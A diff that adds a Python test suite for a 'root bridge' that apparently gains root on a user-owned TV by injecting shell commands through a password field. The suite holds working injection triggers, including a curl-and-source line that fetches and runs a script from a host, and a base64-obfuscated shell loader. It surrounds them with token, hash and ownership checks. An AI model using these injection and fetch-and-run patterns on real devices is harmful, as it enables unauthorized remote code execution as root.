@@ -1,0 +1,299 @@
+"""Offline HTTP integration checks for the bounded inventory receiver."""
+import http.client
+import importlib.util
+import json
+import hashlib
+import base64
+import os
+import shutil
+import socket
+import subprocess
+from pathlib import Path
+import tempfile
+import threading
+import unittest
+
+spec = importlib.util.spec_from_file_location('bridge', Path(__file__).with_name('root-bridge.py'))
+bridge = importlib.util.module_from_spec(spec)
+spec.loader.exec_module(bridge)
+TOKEN = 'a' * 24
+paste_spec = importlib.util.spec_from_file_location('paste', Path(__file__).with_name('paste-password.py'))
+paste = importlib.util.module_from_spec(paste_spec)
+paste_spec.loader.exec_module(paste)
+REPORT = b'DANSTV-ROOT-CHANNEL mode=Snapshot\nDANSTV-EUID=0\nstdout and stderr\nDANSTV-EXIT=0\nDANSTV-END-OF-REPORT\n'
+
+
+class TransportTests(unittest.TestCase):
+    def setUp(self):
+        self.directory = tempfile.TemporaryDirectory()
+        self.output = Path(self.directory.name) / 'report.txt'
+        self.server = bridge.SnapshotServer(('127.0.0.1', 0), '127.0.0.1', TOKEN, self.output)
+        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
+        self.thread.start()
+
+    def tearDown(self):
+        self.server.shutdown()
+        self.server.server_close()
+        self.thread.join()
+        self.directory.cleanup()
+
+    def request(self, method, path, body=None, headers=None):
+        connection = http.client.HTTPConnection(*self.server.server_address, timeout=4)
+        connection.request(method, path, body=body, headers=headers or {})
+        response = connection.getresponse()
+        result = response.status, response.read()
+        connection.close()
+        return result
+
+    def fetch(self):
+        return self.request('GET', '/d/' + TOKEN)
+
+    def test_roundtrip_and_replay(self):
+        status, script = self.fetch()
+        self.assertEqual(status, 200)
+        self.assertIn(b'2>&1', script)
+        self.assertEqual(self.fetch()[0], 409)
+        self.assertEqual(self.request('POST', '/r/' + TOKEN, REPORT)[0], 204)
+        self.assertEqual(self.output.read_bytes(), REPORT)
+        self.assertEqual(self.request('POST', '/r/' + TOKEN, REPORT)[0], 409)
+
+    def test_staged_result_without_fetch_is_one_time_and_bound_to_token(self):
+        # Staging happened via a separately hash-checked SDB transfer.
+        self.server.served = True
+        self.assertEqual(self.fetch()[0], 409)
+        self.assertEqual(self.request('POST', '/r/' + 'b' * 24, REPORT)[0], 404)
+        self.assertEqual(self.request('POST', '/r/' + TOKEN,
+                                      REPORT.replace(b'EUID=0', b'EUID=901'))[0], 422)
+        self.assertEqual(self.request('POST', '/r/' + TOKEN, REPORT)[0], 204)
+        self.assertEqual(self.output.read_bytes(), REPORT)
+        self.assertEqual(self.request('POST', '/r/' + TOKEN, REPORT)[0], 409)
+
+    def test_staged_payload_is_content_form_and_path_constrained(self):
+        remote = '/home/owner/share/tmp/sdk_tools/dtvs' + TOKEN[:8] + '.sh'
+        body_remote = '/home/owner/share/tmp/sdk_tools/dtvb' + TOKEN[:8] + '.sh'
+        body = bridge.staged_body_text('127.0.0.1', TOKEN)
+        digest = hashlib.sha256(body).hexdigest()
+        result = bridge.staged_command_text('127.0.0.1', TOKEN, remote,
+                                             body_remote, digest)
+        self.assertTrue(result.startswith(b'/bin/sh -c "$(printf %s '))
+        self.assertTrue(result.endswith(b'| /usr/bin/base64 -d)"\n'))
+        self.assertNotIn(b'http://127.0.0.1', result)
+        encoded = result.split(b'printf %s ', 1)[1].split(b' |', 1)[0]
+        decoded = base64.b64decode(encoded, validate=True)
+        self.assertIn(b'sha256sum "$BODY"', decoded)
+        self.assertIn(b'http://127.0.0.1:8181/v/' + TOKEN.encode(), decoded)
+        self.assertIn(body_remote.encode(), decoded)
+        self.assertIn(b'DANSTV-ROOT-CHANNEL', body)
+        for bad in ('/tmp/test.sh', remote + ';id',
+                    '/home/owner/share/tmp/sdk_tools/other.sh'):
+            with self.assertRaises(ValueError):
+                bridge.staged_command_text('127.0.0.1', TOKEN, bad,
+                                           body_remote, digest)
+        with self.assertRaises(ValueError):
+            bridge.staged_command_text('127.0.0.1', TOKEN, remote,
+                                       body_remote + ';id', digest)
+        with self.assertRaises(ValueError):
+            bridge.staged_command_text('127.0.0.1', TOKEN, remote,
+                                       body_remote, '0' * 63)
+    def test_staged_password_matches_verified_session(self):
+        lab = Path(self.directory.name)
+        remote = '/home/owner/share/tmp/sdk_tools/dtvs' + TOKEN[:8] + '.sh'
+        trigger = '$(eval${IFS}$(cat${IFS}' + remote + '))'
+        self.assertLessEqual(len(trigger), 90)
+        self.assertNotIn('<', trigger)
+        self.assertNotIn('|', trigger)
+        self.assertNotIn('&', trigger)
+        (lab / 'lab.env').write_text('TVPROBE_PASSWORD=' + trigger + '\n', encoding='ascii')
+        (lab / 'lab.env.before-snapshot').touch()
+        (lab / 'ownership.json').write_text(json.dumps({
+            'pc': '192.0.2.10', 'tv': '192.0.2.20', 'user': 'danstvprobe',
+            'share': 'DansTVProbe'}), encoding='utf-8')
+        session = {
+            'token': TOKEN, 'host': '192.0.2.10', 'tv': '192.0.2.20',
+            'mode': 'Staged', 'stage_remote': remote,
+        }
+        (lab / 'snapshot-session.json').write_text(json.dumps(session), encoding='ascii')
+        self.assertEqual(paste.prepared_password(lab), trigger)
+        session['stage_remote'] = remote.replace(TOKEN[:8], 'b' * 8)
+        (lab / 'snapshot-session.json').write_text(json.dumps(session), encoding='ascii')
+        with self.assertRaises(ValueError):
+            paste.prepared_password(lab)
+
+    @unittest.skipUnless(os.name == 'posix' and shutil.which('bash') and shutil.which('base64'),
+                         'shell grammar rehearsal requires Linux bash and base64')
+    def test_short_trigger_executes_staged_content_without_stdout(self):
+        import base64
+        stage = Path(self.directory.name) / 'stage.sh'
+        target = Path(self.directory.name) / 'result.txt'
+        contents = 'printf STAGED_OK > "$DANSTV_TEST_RESULT"'
+        encoded = base64.b64encode(contents.encode('ascii')).decode('ascii')
+        stage.write_text('/bin/sh -c "$(printf %s ' + encoded +
+                         ' | /usr/bin/base64 -d)"\n', encoding='ascii')
+        trigger = '$(eval${IFS}$(cat${IFS}' + str(stage) + '))'
+        env = os.environ.copy()
+        env['DANSTV_TEST_RESULT'] = str(target)
+        run = subprocess.run(['bash', '-c', trigger], env=env, capture_output=True, timeout=10)
+        self.assertEqual(run.returncode, 0, run.stderr)
+        self.assertEqual(run.stdout, b'')
+        self.assertEqual(target.read_text(), 'STAGED_OK')
+
+    def test_staged_receiver_blocks_report_until_hash_confirmed(self):
+        expected = hashlib.sha256(b'safe fixed survey').hexdigest()
+        self.server.expected_hash = expected
+        self.server.stage_verified = False
+        self.server.served = True
+        self.assertEqual(self.request('POST', '/r/' + TOKEN, REPORT)[0], 409)
+        self.assertEqual(self.request('POST', '/v/' + ('b' * 24),
+                                      expected.encode())[0], 404)
+        self.assertEqual(self.request('POST', '/v/' + TOKEN,
+                                      b'0' * 64)[0], 422)
+        self.assertFalse(self.output.exists())
+        status, body = self.request('POST', '/v/' + TOKEN, expected.encode())
+        self.assertEqual((status, body), (200, b'OK'))
+        self.assertEqual(self.request('POST', '/v/' + TOKEN,
+                                      expected.encode())[0], 409)
+        self.assertEqual(self.request('POST', '/r/' + TOKEN, REPORT)[0], 204)
+        self.assertEqual(self.output.read_bytes(), REPORT)
+
+    @unittest.skipUnless(os.name == 'posix' and shutil.which('bash') and
+                         shutil.which('sha256sum') and Path('/usr/bin/curl').exists(),
+                         'staged checksum shell rehearsal requires Linux')
+    def test_staged_loader_requires_tv_observed_checksum(self):
+        # Simulate the loader and receiver against synthetic files, not TV.
+        approved_body = b'printf APPROVED > "$DANSTV_TEST_RESULT"\n'
+        self.server.expected_hash = hashlib.sha256(approved_body).hexdigest()
+        self.server.stage_verified = False
+        self.server.served = True
+        remote = '/home/owner/share/tmp/sdk_tools/dtvs' + TOKEN[:8] + '.sh'
+        body_remote = '/home/owner/share/tmp/sdk_tools/dtvb' + TOKEN[:8] + '.sh'
+        local_body = Path(self.directory.name) / 'body.sh'
+        local_stage = Path(self.directory.name) / 'stage.sh'
+        target = Path(self.directory.name) / 'executed.txt'
+        local_body.write_bytes(approved_body)
+        original = bridge.staged_command_text('127.0.0.1', TOKEN, remote,
+                                               body_remote, self.server.expected_hash)
+        encoded = original.split(b'printf %s ', 1)[1].split(b' |', 1)[0]
+        source = base64.b64decode(encoded).decode('ascii')
+        source = source.replace(body_remote, str(local_body))
+        source = source.replace(':8181/v/', ':' + str(self.server.server_address[1]) + '/v/')
+        runtime_encoded = base64.b64encode(source.encode('ascii')).decode('ascii')
+        local_stage.write_text('/bin/sh -c "$(printf %s ' + runtime_encoded +
+                               ' | /usr/bin/base64 -d)"\n', encoding='ascii')
+        env = os.environ.copy()
+        env['DANSTV_TEST_RESULT'] = str(target)
+
+        local_body.write_bytes(b'printf UNSAFE > "$DANSTV_TEST_RESULT"\n')
+        first = subprocess.run(['bash', str(local_stage)], env=env,
+                               capture_output=True, timeout=15)
+        self.assertFalse(target.exists())
+        self.assertFalse(self.server.stage_verified)
+
+        local_body.write_bytes(approved_body)
+        second = subprocess.run(['bash', str(local_stage)], env=env,
+                                capture_output=True, timeout=15)
+        self.assertEqual(second.returncode, 0, second.stderr)
+        self.assertEqual(target.read_text(), 'APPROVED')
+        self.assertTrue(self.server.stage_verified)
+
+    def test_token_and_source_restrictions(self):
+        self.assertEqual(self.request('GET', '/d/' + 'b' * 24)[0], 404)
+        self.server.tv = '192.0.2.1'
+        self.assertEqual(self.fetch()[0], 404)
+        self.assertFalse(self.output.exists())
+
+    def test_result_requires_fetch_root_and_success(self):
+        self.assertEqual(self.request('POST', '/r/' + TOKEN, REPORT)[0], 409)
+        self.fetch()
+        for bad in (REPORT.replace(b'EUID=0', b'EUID=901'),
+                    REPORT.replace(b'EXIT=0', b'EXIT=1'), REPORT[:-8]):
+            self.assertEqual(self.request('POST', '/r/' + TOKEN, bad)[0], 422)
+        self.assertFalse(self.output.exists())
+
+    def test_length_limit_and_existing_backup(self):
+        self.fetch()
+        self.assertEqual(self.request('POST', '/r/' + TOKEN, b'', {'Content-Length': str(bridge.LIMIT + 1)})[0], 413)
+        self.output.write_bytes(b'original')
+        self.assertEqual(self.request('POST', '/r/' + TOKEN, REPORT)[0], 409)
+        self.assertEqual(self.output.read_bytes(), b'original')
+
+    def test_payload_rejects_command_and_token_injection(self):
+        with self.assertRaises(ValueError):
+            bridge.command_text('Apply', '127.0.0.1', TOKEN)
+        with self.assertRaises(ValueError):
+            bridge.command_text('Snapshot', '127.0.0.1', 'x;id')
+
+    def test_shutdown_revokes_listener(self):
+        address = self.server.server_address
+        self.server.shutdown()
+        self.server.server_close()
+        self.thread.join(timeout=2)
+        self.assertFalse(self.thread.is_alive())
+        with self.assertRaises(OSError):
+            socket.create_connection(address, timeout=1)
+
+    def test_snapshot_password_matches_session_and_rejects_stale_or_modified(self):
+        lab = Path(self.directory.name)
+        token = TOKEN
+        tmp = '/tmp/dtv' + token[:6]
+        trigger = ('$(/usr/bin/curl${IFS}-fsS${IFS}http://192.0.2.10:8181/d/' +
+                   token + '>' + tmp + '&&.${IFS}' + tmp + ')')
+        self.assertLessEqual(len(trigger), 160)
+        (lab / 'lab.env').write_text('TVPROBE_PASSWORD=' + trigger, encoding='ascii')
+        (lab / 'lab.env.before-snapshot').touch()
+        (lab / 'ownership.json').write_text(json.dumps({'pc': '192.0.2.10',
+            'tv': '192.0.2.20', 'user': 'danstvprobe', 'share': 'DansTVProbe'}), encoding='utf-8')
+        (lab / 'snapshot-session.json').write_text(json.dumps({
+            'token': token, 'host': '192.0.2.10', 'tv': '192.0.2.20'}), encoding='ascii')
+        self.assertEqual(paste.prepared_password(lab), trigger)
+        (lab / 'lab.env').write_text('TVPROBE_PASSWORD=' + trigger + ';id', encoding='ascii')
+        with self.assertRaises(ValueError):
+            paste.prepared_password(lab)
+        (lab / 'lab.env.before-uid').touch()
+        with self.assertRaises(ValueError):
+            paste.prepared_password(lab)
+
+    def test_ordinary_password_requires_restored_owned_lab(self):
+        lab = Path(self.directory.name)
+        original = 'TvA9A1B2C3D4E5F6'
+        env = lab / 'lab.env'
+        env.write_text('TVPROBE_USER=danstvprobe\nTVPROBE_PASSWORD=' + original + '\n', encoding='ascii')
+        owner = lab / 'ownership.json'
+        owner.write_text(json.dumps({'user': 'danstvprobe', 'share': 'DansTVProbe'}), encoding='utf-8')
+        self.assertEqual(paste.normal_password(lab), original)
+        for marker in ('lab.env.before-uid', 'lab.env.before-snapshot', 'snapshot-session.json'):
+            path = lab / marker
+            path.touch()
+            with self.assertRaises(ValueError):
+                paste.normal_password(lab)
+            path.unlink()
+        for invalid in ('$(/usr/bin/curl${IFS}http://test)', 'TvA9abc123', 'a' * 16):
+            env.write_text('TVPROBE_PASSWORD=' + invalid + '\n', encoding='ascii')
+            with self.assertRaises(ValueError):
+                paste.normal_password(lab)
+        env.write_text('TVPROBE_PASSWORD=' + original + '\nTVPROBE_PASSWORD=' + original + '\n',
+                       encoding='ascii')
+        with self.assertRaises(ValueError):
+            paste.normal_password(lab)
+        env.write_text('TVPROBE_PASSWORD=' + original + '\n', encoding='ascii')
+        owner.write_text(json.dumps({'user': 'other', 'share': 'DansTVProbe'}), encoding='utf-8')
+        with self.assertRaises(ValueError):
+            paste.normal_password(lab)
+
+    @unittest.skipUnless(os.name == 'posix' and shutil.which('bash') and Path('/usr/bin/curl').exists()
+                         and os.geteuid() == 0, 'requires disposable Linux root test container')
+    def test_actual_bash_download_source_report_and_cleanup(self):
+        # Exercise the real curl/source/POST chain against Linux, never a TV.
+        port = self.server.server_address[1]
+        self.server.payload = self.server.payload.replace(b':8181/', f':{port}/'.encode())
+        tmp = '/tmp/dtv' + TOKEN[:6]
+        trigger = ('$(/usr/bin/curl${IFS}-fsS${IFS}http://127.0.0.1:' + str(port) +
+                   '/d/' + TOKEN + '>' + tmp + '&&.${IFS}' + tmp + ')')
+        result = subprocess.run(['bash', '-c', trigger], capture_output=True, timeout=35)
+        self.assertEqual(result.returncode, 0, result.stderr)
+        self.assertTrue(self.server.received)
+        self.assertTrue(bridge.valid_report(self.output.read_bytes()))
+        self.assertFalse(Path(tmp).exists())
+
+
+if __name__ == '__main__':
+    unittest.main()
